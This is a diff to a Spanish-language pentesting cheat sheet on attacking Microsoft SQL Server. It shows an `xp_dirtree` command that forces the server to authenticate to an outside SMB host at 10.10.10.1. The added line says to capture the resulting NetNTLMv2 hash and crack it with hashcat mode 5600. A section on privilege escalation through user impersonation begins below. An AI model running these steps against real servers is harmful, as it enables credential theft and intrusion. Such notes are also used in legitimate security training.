@@ -152,7 +152,8 @@ Usando procedimientos almacenados `xp_dirtree` o `xp_subdirs` para enviar una so
     ```mssql
     EXEC xp_dirtree '\\10.10.10.1\share\';
     GO
-    ```    
+    ```
+ 3. Capturamos hash `NetNTLMv2` y hacemos fuerza bruta con hashcat -`m 5600`   
 ### Suplantación de Usuarios (MSSQL)
 El servidor SQL tiene unos servicios especiales, `IMPERSONATE`,  que permite ejecutar al usuario acciones con los permisos de otro usuario
 1. Comprobar si nuestro usuario tiene permisos de administrador:
